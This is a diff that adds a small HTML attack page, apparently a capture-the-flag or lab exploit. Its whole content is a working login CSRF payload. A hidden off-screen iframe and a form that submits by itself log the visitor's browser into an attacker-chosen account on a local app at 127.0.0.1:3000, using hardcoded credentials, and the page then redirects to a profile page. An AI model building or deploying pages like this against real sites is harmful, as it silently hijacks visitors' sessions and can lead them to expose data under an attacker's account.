@@ -1,0 +1,15 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>load</title></head>
+<body style="margin:0;background:#fff">
+<iframe name="lf" style="position:absolute;left:-9999px;width:1px;height:1px"></iframe>
+<form id="f" method="POST" action="http://127.0.0.1:3000/login" target="lf">
+<input type="hidden" name="username" value="drone9271">
+<input type="hidden" name="password" value="DronePass9271">
+</form>
+<script>
+try { document.getElementById('f').submit(); } catch(e){}
+setTimeout(function(){
+  window.location.href = 'http://127.0.0.1:3000/profile#clearance';
+}, 2000);
+</script>
+</body></html>
